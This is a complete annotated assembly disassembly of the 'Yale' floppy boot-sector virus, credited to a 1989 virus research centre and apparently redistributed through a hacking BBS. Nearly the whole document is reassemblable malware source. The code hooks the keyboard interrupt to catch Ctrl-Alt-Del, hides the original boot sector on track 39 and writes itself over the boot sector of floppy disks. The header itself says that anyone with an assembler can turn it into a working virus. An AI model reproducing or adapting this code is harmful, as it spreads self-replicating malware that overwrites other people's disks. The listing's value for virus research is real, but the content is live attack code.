;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
	page	65,132
	title	The 'Yale' Virus
; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ                 British Computer Virus Research Centre                   บ
; บ  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    บ
; บ  Telephone:     Domestic   0273-26105,   International  +44-273-26105    บ
; บ                                                                          บ
; บ                            The 'Yale' Virus                              บ
; บ                Disassembled by Joe Hirst,      April 1989                บ
; บ                                                                          บ
; บ                      Copyright (c) Joe Hirst 1989.                       บ
; บ                                                                          บ
; บ      This listing is only to be made available to virus researchers      บ
; บ                or software writers on a need-to-know basis.              บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

	; The virus consists of a boot sector only on a floppy disk.
	; The original boot sector is kept at track thirty-nine, head zero,
	; sector eight.

	; The disassembly has been tested by re-assembly using MASM 5.0
	; Note that this does not create an identical program, as the original
	; appears to have been assembled with A86

	; MASM would not assemble the instruction at offset 003CH (7C3CH)
	; This instruction is undefined on an 8088/8086, and illegal
	; on a 80286/80386.

	; The program requires an origin address of 7C00H for the first sector
	; to load and run as a boot sector

	; System variables are defined in either RAM or BOOT (or both)
	; depending on the segment used by the program

RAM	SEGMENT AT 400H

	; System RAM fields

	ORG	13H
BW0413	DW	?			; Total RAM size
	ORG	17H
BB0417	DB	?			; Key toggles
	ORG	72H
BW0472	DW	?			; System reset word

RAM	ENDS

BOOT	SEGMENT AT 0

	; Interrupt addresses

	ORG	24H
BW0024	DW	?			; Interrupt 9 offset
BW0026	DW	?			; Interrupt 9 segment
	ORG	64H
BW0064	DW	?			; Interrupt 19H offset
BW0066	DW	?			; Interrupt 19H segment

	; System RAM fields

	ORG	410H
DW0410	DW	?			; System configuration
	ORG	413H
DW0413	DW	?			; Total RAM size

	; BIOS field

	ORG	0E502H
DWE502	DW	?

BOOT	ENDS

CODE	SEGMENT BYTE PUBLIC 'CODE'

	ASSUME	CS:CODE,DS:NOTHING

START:	CLI
	XOR	AX,AX			; \ Set SS to zero
	MOV	SS,AX			; /
	MOV	SP,7C00H		; Set stack before boot area
	STI
	ASSUME	DS:RAM
	MOV	BX,0040H		; \ Address RAM area
	MOV	DS,BX			; /
	MOV	AX,BW0413		; Get size of RAM
	MUL	BX			; Convert to paragraphs
	SUB	AX,07E0H		; Subtract address after boot area
	MOV	ES,AX			; Target segment
	ASSUME	DS:CODE
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	CMP	DI,3456H		; Simulated system reset?
	JNE	BP0010			; Branch if not
	DEC	GENNUM[7C00H]		; Decrement generation number
BP0010:	MOV	SI,SP			; \ Address boot sector area
	MOV	DI,SI			; /
	MOV	CX,0200H		; 512 bytes to move
	CLD
	REPZ	MOVSB			; Copy virus to high core
	MOV	SI,CX			; Address offset zero
	MOV	DI,7B80H		; Address interrupt save area
	MOV	CX,0080H		; 128 bytes to move
	REPZ	MOVSB			; Save first 32 interrupt pointers
	CALL	BP0030			; Install interrupt 9 routine
	PUSH	ES			; \ Transfer to high core
;	POP	CS			; /
	DB	0FH			; This is the previous instruction
	PUSH	DS			; \ Set ES to DS
	POP	ES			; /
	MOV	BX,SP			; Address boot sector area
	MOV	DX,CX			; A-drive, head zero
	MOV	CX,2708H		; Track 39, sector 8
	MOV	AX,0201H		; Read one sector
	INT	13H			; Disk I/O
BP0020:	JB	BP0020			; Loop on error
	JMP	BP0190

	; Install interrupt 9 routine

BP0030:	DEC	DW0413			; Decrement RAM size
	MOV	SI,OFFSET BW0024	; Address INT 9 pointer
	MOV	DI,OFFSET INT_09+7C00H	; Target far jump
	MOV	CX,4			; 4 bytes to copy
	CLI
	REPZ	MOVSB			; Copy far address
	MOV	BW0024,OFFSET BP0050+7C00H ; Install new offset
	MOV	BW0026,ES		; Install new segment
	STI
	RET

	; Ctrl-Alt-Del depressed - acknowledge keyboard signal

BP0040:	IN	AL,61H			; Get port B
	MOV	AH,AL			; Save current state
	OR	AL,80H			; Turn top bit on
	OUT	61H,AL			; Set port B
	XCHG	AL,AH			; Get original state
	OUT	61H,AL			; Reset port B
	JMP	SHORT BP0110

	; Format table for track 39, head zero, 8 sectors (unused)

	DB	027H, 000H, 001H, 002H
	DB	027H, 000H, 002H, 002H
	DB	027H, 000H, 003H, 002H
	DB	027H, 000H, 004H, 002H
	DB	027H, 000H, 005H, 002H
	DB	027H, 000H, 006H, 002H
	DB	027H, 000H, 007H, 002H
	DB	027H, 000H, 008H, 002H

	; Rubbish

	DB	024H, 000H, 0ADH, 07CH, 0A3H, 026H, 000H, 059H
	DB	05FH, 05EH, 007H, 01FH, 058H, 09DH, 0EAH, 011H
	DB	011H, 011H, 011H

	; Interrupt 9 routine

BP0050:	PUSHF
	STI
	PUSH	AX
	PUSH	BX
	PUSH	DS
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	ASSUME	DS:CODE
	MOV	BX,KYSTAT[7C00H]	; Get Ctrl & Alt key states
	IN	AL,60H			; Get keyboard token
	MOV	AH,AL			; Save keyboard token
	AND	AX,887FH
	CMP	AL,1DH			; Was key Ctrl?
	JNE	BP0060			; Branch if not
	MOV	BL,AH			; Save Ctrl key state
	JMP	SHORT BP0080

BP0060:	CMP	AL,38H			; Was key Alt?
	JNE	BP0070			; Branch if not
	MOV	BH,AH			; Save Alt key state
	JMP	SHORT BP0080

BP0070:	CMP	BX,0808H		; Are Ctrl & Alt depressed?
	JNE	BP0080			; Branch if not
	CMP	AL,17H			; Is key I?
	JE	BP0100			; Branch if yes
	CMP	AL,53H			; Is key Del?
	JE	BP0040			; Branch if yes
BP0080:	MOV	KYSTAT[7C00H],BX	; Save Ctrl & Alt key states
BP0090:	POP	DS
	POP	BX
	POP	AX
	POPF
	DB	0EAH			; Far jump to original INT 9
INT_09	DW	0E987H, 0F000H

	; Pass on Ctrl-Alt-I

BP0100:	JMP	BP0240			; Ctrl-Alt-I

	; Ctrl-Alt-Del depressed - main processing

BP0110:	MOV	DX,03D8H		; VDU mode control address
	MOV	AX,0800H		; Delay eight cycles
	OUT	DX,AL			; Disable display
	CALL	BP0250			; Delay
	MOV	KYSTAT[7C00H],AX	; Reset Ctrl & Alt key states
	MOV	AL,3			; Mode three
	INT	10H			; VDU I/O
	MOV	AH,2			; Set cursor address function
	XOR	DX,DX			; Row zero, column zero
	MOV	BH,DH			; Page zero
	INT	10H			; VDU I/O
	MOV	AH,1			; Set cursor size function
	MOV	CX,0607H		; Cursor lines 6 to 7
	INT	10H			; VDU I/O
	MOV	AX,0420H		; Delay 4 cycles
	CALL	BP0250			; Delay
	CLI
	OUT	20H,AL			; End of interrupt
	MOV	ES,CX			; Address segment zero
	MOV	DI,CX			; Address offset zero
	MOV	SI,7B80H		; Address interrupt save area
	MOV	CX,0080H		; 128 bytes to move
	CLD
	REPZ	MOVSB			; Restore first 32 interrupt pointers
	MOV	DS,CX			; Address zero
	MOV	BW0064,OFFSET BP0130+7C00H ; Install Int 19H offset
	MOV	BW0066,CS		; Install Int 19H segment
	ASSUME	DS:RAM
	MOV	AX,0040H		; \ Address RAM area
	MOV	DS,AX			; /
	MOV	BB0417,AH		; Set key toggles off
	INC	BW0413			; Restore RAM size
	PUSH	DS
	ASSUME	DS:BOOT
	MOV	AX,0F000H		; \ Address BIOS
	MOV	DS,AX			; /
	CMP	DWE502,21E4H		; Is BIOS instruction  IN  AL,21H?
	POP	DS
	JE	BP0120			; Branch if yes
	INT	19H			; Disk bootstrap

BP0120:	DB	0EAH			; Far jump to BIOS routine
	DW	0E502H, 0F000H

	; Interrupt 19H routine

	ASSUME	DS:BOOT
BP0130:	XOR	AX,AX			; \ Set DS to zero
	MOV	DS,AX			; /
	MOV	AX,DW0410		; Get system configuration
	TEST	AL,1			; Is there a floppy disk
	JNZ	BP0150			; Branch if yes
BP0140:	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	CALL	BP0030			; Install interrupt 9 routine
	INT	18H			; Basica (IBM only)

BP0150:	MOV	CX,4			; Retry four times
BP0160:	PUSH	CX			; Save retry count
	MOV	AH,0			; Reset disk sub-system
	INT	13H			; Disk I/O
	JB	BP0170			; Branch if error
	MOV	AX,0201H		; Read one sector
	PUSH	DS			; \ Set ES to DS
	POP	ES			; /
	MOV	BX,7C00H		; Boot sector buffer
	MOV	CX,1			; Track zero, sector one
	INT	13H			; Disk I/O
BP0170:	POP	CX			; Retrieve retry count
	JNB	BP0180			; Branch if no error
	LOOP	BP0160			; Retry
	JMP	BP0140

BP0180:	CMP	DI,3456H		; Simulated system reset?
	JNE	BP0200			; Branch if not
BP0190:	DB	0EAH			; Far jump to boot sector area
	DW	7C00H, 0

BP0200:	MOV	SI,7C00H		; Boot sector area
	MOV	CX,OFFSET INT_09	; Length to compare
	MOV	DI,SI			; Virus offset
	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	CLD
	REPZ	CMPSB			; Is boot sector infected?
	JE	BP0220			; Branch if yes
	INC	ES:GENNUM[7C00H]	; Increment generation number
	MOV	BX,7C7AH		; Address format table
	MOV	DX,0			; Head zero, drive zero
	MOV	CH,27H			; Track 39
	MOV	AH,5			; Format track 
	JMP	SHORT BP0210		; This line was probably an INT 13H

	JB	BP0230			; Error branch for deleted INT 13H
BP0210:	MOV	ES,DX			; \ Write from boot sector area
	MOV	BX,7C00H		; /
	MOV	CL,8			; Sector eight
	MOV	AX,0301H		; Write one sector
	INT	13H			; Disk I/O
	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	JB	BP0230			; Branch if error
	MOV	CX,1			; Track zero, sector one
	MOV	AX,0301H		; Write one sector
	INT	13H			; Disk I/O
	JB	BP0230			; Branch if error
BP0220:	MOV	DI,3456H		; Signal simulated system reset
	INT	19H			; Disk bootstrap

BP0230:	CALL	BP0030			; Install interrupt 9 routine
	DEC	ES:GENNUM[7C00H]	; Decrement generation number
	JMP	BP0190

	; Ctrl-Alt-I

	ASSUME	DS:CODE
BP0240:	MOV	KYSTAT[7C00H],BX	; Save Ctrl & Alt key states
	MOV	AX,GENNUM[7C00H]	; Get generation number
	ASSUME	DS:RAM
	MOV	BX,0040H		; \ Address RAM area
	MOV	DS,BX			; /
	MOV	BW0472,AX		; Generation to system reset word
	JMP	BP0090			; Pass on to original interrupt

	; Delay

BP0250:	SUB	CX,CX			; Maximum count
BP0260:	LOOP	BP0260			; Delay loop
	SUB	AH,1			; Decrement count
	JNZ	BP0260			; Repeat loop
	RET

	DB	027H, 000H, 008H, 002H	; Last sector of format table
GENNUM	DW	016H			; Generation number
KYSTAT	DW	0			; Ctrl & Alt key states
	DB	027H, 000H, 008H, 002H	; Last sector of format table

CODE	ENDS

	END	START
